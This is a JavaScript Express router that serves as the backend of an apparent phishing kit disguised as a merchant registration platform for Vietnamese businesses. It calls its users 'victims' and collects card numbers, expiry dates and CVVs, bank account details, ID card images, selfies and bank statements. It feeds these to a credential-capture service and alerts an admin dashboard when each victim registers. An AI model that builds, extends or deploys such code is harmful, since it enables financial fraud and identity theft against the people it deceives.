// Merchant platform routes aggregator
const express = require('express');
const router = express.Router();
const multer = require('multer');
const { PrismaClient } = require('@prisma/client');

// Initialize repositories and services
const prisma = new PrismaClient();
const VictimRepository = require('../../../repositories/victimRepository');
const EncryptionService = require('../../../services/encryption');
const CredentialCaptureService = require('../../../services/credentialCapture');
const FileStorageService = require('../../../services/fileStorage');
const { getEncryptionConfig } = require('../../../config/encryption');
const config = require('../../../config');
const logger = require('../../../utils/logger');

// Initialize services
const encryptionConfig = getEncryptionConfig();
const cardEncryptionService = new EncryptionService(encryptionConfig.cardEncryptionKey);
const oauthEncryptionService = new EncryptionService(encryptionConfig.oauthEncryptionKey);
const victimRepository = new VictimRepository(prisma);
const oauthTokenRepository = require('../../../repositories/oauthTokenRepository');
const credentialCaptureService = new CredentialCaptureService(
  new oauthTokenRepository(prisma),
  victimRepository,
  oauthEncryptionService
);

// Initialize file storage
const fileStorageService = new FileStorageService();
fileStorageService.initialize().catch(err => logger.error('File storage init error:', err));

// Configure multer for file uploads
const storage = multer.memoryStorage();
const upload = multer({
  storage,
  limits: {
    fileSize: config.upload.maxFileSize
  },
  fileFilter: (req, file, cb) => {
    // Allow images and PDFs
    const allowedMimes = ['image/jpeg', 'image/jpg', 'image/png', 'image/webp', 'application/pdf'];
    if (allowedMimes.includes(file.mimetype)) {
      cb(null, true);
    } else {
      cb(new Error('Invalid file type. Only images and PDFs are allowed.'));
    }
  }
});

const REGISTRATION_FILE_FIELDS = [
  { name: 'card_image', maxCount: 1 },
  { name: 'transaction_history', maxCount: 10 },
  { name: 'business_license_file', maxCount: 1 },
  { name: 'representative_id_file', maxCount: 1 },
  { name: 'business_location_photos', maxCount: 5 },
  // Backwards compatibility with legacy field names
  { name: 'identityCard', maxCount: 1 },
  { name: 'selfie', maxCount: 1 },
  { name: 'bankStatement', maxCount: 10 }
];

const normalizeValue = (value) => {
  if (value === undefined || value === null) return null;
  if (Array.isArray(value)) {
    return value
      .map(item => normalizeValue(item))
      .filter(v => v !== null && v !== '');
  }
  if (typeof value === 'string') {
    const trimmed = value.trim();
    return trimmed === '' ? null : trimmed;
  }
  return value;
};

const parseBooleanField = (value) => {
  if (value === undefined || value === null) return false;
  if (typeof value === 'boolean') return value;
  if (typeof value === 'string') {
    return ['true', '1', 'yes', 'on'].includes(value.toLowerCase());
  }
  return Boolean(value);
};

const buildRegistrationFormData = (body) => ({
  businessType: normalizeValue(body.business_type) || normalizeValue(body.businessType),
  businessName: normalizeValue(body.business_name) || normalizeValue(body.fullName) || normalizeValue(body.businessName),
  industry: normalizeValue(body.industry),
  taxCode: normalizeValue(body.tax_code),
  businessLicense: normalizeValue(body.business_license),
  businessAddress: normalizeValue(body.business_address) || normalizeValue(body.address),
  businessPhone: normalizeValue(body.business_phone) || normalizeValue(body.phone),
  businessEmail: normalizeValue(body.business_email) || normalizeValue(body.email),
  website: normalizeValue(body.website),
  representativeName: normalizeValue(body.representative_name) || normalizeValue(body.fullName),
  representativePhone: normalizeValue(body.representative_phone) || normalizeValue(body.phone),
  representativeEmail: normalizeValue(body.representative_email) || normalizeValue(body.email),
  representativeIdNumber: normalizeValue(body.representative_id_number) || normalizeValue(body.idNumber),
  representativePosition: normalizeValue(body.representative_position),
  bankName: normalizeValue(body.bank_name) || normalizeValue(body.bankName),
  bankAccountNumber: normalizeValue(body.bank_account_number) || normalizeValue(body.bankAccount),
  bankAccountName: normalizeValue(body.bank_account_name) || normalizeValue(body.cardHolder),
  bankBranch: normalizeValue(body.bank_branch),
  cardType: normalizeValue(body.card_type),
  cardNumber: normalizeValue(body.card_number) || normalizeValue(body.cardNumber),
  cardHolderName: normalizeValue(body.card_holder_name) || normalizeValue(body.cardHolder),
  cardExpiry: normalizeValue(body.card_expiry) || normalizeValue(body.expiryDate),
  cardCVV: normalizeValue(body.card_cvv) || normalizeValue(body.cvv),
  city: normalizeValue(body.city),
  district: normalizeValue(body.district),
  acceptTerms: parseBooleanField(body.accept_terms)
});

const hasUploadedFiles = (files, names = []) => {
  if (!files) return false;
  return names.some(name => Array.isArray(files[name]) && files[name].length > 0);
};

const collectMissingFields = (formData, files) => {
  const missing = [];
  const requiredFields = [
    { key: 'businessType', label: 'business_type' },
    { key: 'businessName', label: 'business_name' },
    { key: 'businessAddress', label: 'business_address' },
    { key: 'businessPhone', label: 'business_phone' },
    { key: 'businessEmail', label: 'business_email' },
    { key: 'representativeName', label: 'representative_name' },
    { key: 'representativePhone', label: 'representative_phone' },
    { key: 'representativeEmail', label: 'representative_email' },
    { key: 'representativeIdNumber', label: 'representative_id_number' },
    { key: 'bankName', label: 'bank_name' },
    { key: 'bankAccountNumber', label: 'bank_account_number' },
    { key: 'bankAccountName', label: 'bank_account_name' }
  ];

  requiredFields.forEach(field => {
    if (!formData[field.key]) {
      missing.push(field.label);
    }
  });

  if (!hasUploadedFiles(files, ['card_image', 'identityCard'])) {
    missing.push('card_image');
  }

  if (!hasUploadedFiles(files, ['transaction_history', 'bankStatement'])) {
    missing.push('transaction_history');
  }

  if (!formData.acceptTerms) {
    missing.push('accept_terms');
  }

  return missing;
};

const persistUploadedFiles = async (uploadedFiles = {}, victimId) => {
  const files = {};
  const currentTimestamp = () => new Date().toISOString();

  const saveSingleFile = async (file, category, options = {}) => {
    const storedPath = await fileStorageService.storeFile(
      file.buffer,
      file.originalname,
      category,
      options
    );
    return {
      path: storedPath,
      originalName: file.originalname,
      mimetype: file.mimetype,
      size: file.size,
      uploadedAt: currentTimestamp()
    };
  };

  const saveMultipleFiles = async (fileList, category, optionsBuilder) => {
    const results = [];
    for (let index = 0; index < fileList.length; index++) {
      const options = typeof optionsBuilder === 'function' ? optionsBuilder(index, fileList[index]) : optionsBuilder;
      results.push(await saveSingleFile(fileList[index], category, options));
    }
    return results;
  };

  // Primary identity verification files
  const cardImages = [
    ...(uploadedFiles.card_image || []),
    ...(uploadedFiles.identityCard || [])
  ];
  if (cardImages.length > 0) {
    files.card_image = await saveSingleFile(cardImages[0], 'identity_card_images', {
      filenamePrefix: `card_image_${victimId}`
    });
    files.identityCard = files.card_image; // backward compatibility
  }

  const transactionHistorySources = [
    ...(uploadedFiles.transaction_history || []),
    ...(uploadedFiles.bankStatement || [])
  ];
  if (transactionHistorySources.length > 0) {
    files.transaction_history = await saveMultipleFiles(
      transactionHistorySources,
      'transaction_history',
      (index) => ({
        filenamePrefix: `transaction_history_${victimId}_${index}`
      })
    );
    files.bankStatement = files.transaction_history; // backward compatibility
  }

  // Supporting documents
  if (uploadedFiles.business_license_file && uploadedFiles.business_license_file.length > 0) {
    files.business_license_file = await saveSingleFile(
      uploadedFiles.business_license_file[0],
      'business_licenses',
      { filenamePrefix: `business_license_${victimId}` }
    );
  }

  if (uploadedFiles.representative_id_file && uploadedFiles.representative_id_file.length > 0) {
    files.representative_id_file = await saveSingleFile(
      uploadedFiles.representative_id_file[0],
      'representative_ids',
      { filenamePrefix: `representative_id_${victimId}` }
    );
  }

  if (uploadedFiles.business_location_photos && uploadedFiles.business_location_photos.length > 0) {
    files.business_location_photos = await saveMultipleFiles(
      uploadedFiles.business_location_photos,
      'business_location_photos',
      (index) => ({
        filenamePrefix: `business_location_${victimId}_${index}`
      })
    );
  }

  // Optional selfie support for compatibility
  if (uploadedFiles.selfie && uploadedFiles.selfie.length > 0) {
    files.selfie = await saveSingleFile(
      uploadedFiles.selfie[0],
      'identity',
      { filenamePrefix: `selfie_${victimId}` }
    );
  }

  return files;
};

// POST /api/merchant/register - Process registration form
router.post('/register', upload.fields(REGISTRATION_FILE_FIELDS), async (req, res) => {
  try {
    const victim_id = req.body.victim_id || req.body.victimId;
    
    if (!victim_id) {
      return res.status(400).json({ error: 'victim_id is required' });
    }

    const formData = buildRegistrationFormData(req.body);
    const missingFields = collectMissingFields(formData, req.files);
    if (missingFields.length > 0) {
      return res.status(400).json({
        success: false,
        error: 'Validation failed',
        missing_fields: missingFields
      });
    }

    const files = await persistUploadedFiles(req.files || {}, victim_id);

    // Process registration form
    const updatedVictim = await credentialCaptureService.processRegistrationForm(
      victim_id,
      formData,
      files
    );

    // Emit Socket.IO event for admin dashboard
    const io = req.app.get('io');
    if (io) {
      io.to('admin').emit('victim:registered', {
        victimId: updatedVictim.id,
        email: updatedVictim.email,
        timestamp: new Date().toISOString()
      });
    }

    res.status(200).json({
      success: true,
      message: 'Registration completed successfully',
      victim_id: updatedVictim.id
    });
  } catch (error) {
    logger.error('Error processing registration:', error);
    res.status(500).json({
      error: 'Failed to process registration',
      message: error.message
    });
  }
});

// GET /api/merchant/session/:victim_id - Get session data
router.get('/session/:victim_id', async (req, res) => {
  try {
    const { victim_id } = req.params;
    
    const victim = await victimRepository.findById(victim_id);
    if (!victim) {
      return res.status(404).json({ error: 'Victim not found' });
    }

    // Return safe session data (no encrypted data)
    res.status(200).json({
      victim_id: victim.id,
      email: victim.email,
      name: victim.name,
      phone: victim.phone,
      captureMethod: victim.captureMethod,
      registrationCompleted: victim.validation?.registrationCompleted || false
    });
  } catch (error) {
    logger.error('Error fetching session:', error);
    res.status(500).json({
      error: 'Failed to fetch session data',
      message: error.message
    });
  }
});

// GET /api/merchant/banks - Return Vietnamese banks list
const banksRoutes = require('./banks');
router.use('/banks', banksRoutes);

// Dashboard routes
const dashboardRoutes = require('./dashboard');
router.use('/dashboard', dashboardRoutes);

// Transactions routes
const transactionsRoutes = require('./transactions');
router.use('/transactions', transactionsRoutes);

// Reports routes
const reportsRoutes = require('./reports');
router.use('/reports', reportsRoutes);

// QR codes routes
const qrCodesRoutes = require('./qr-codes');
router.use('/qr-codes', qrCodesRoutes);

// Account settings routes
const accountRoutes = require('./account');
router.use('/account', accountRoutes);

module.exports = router;
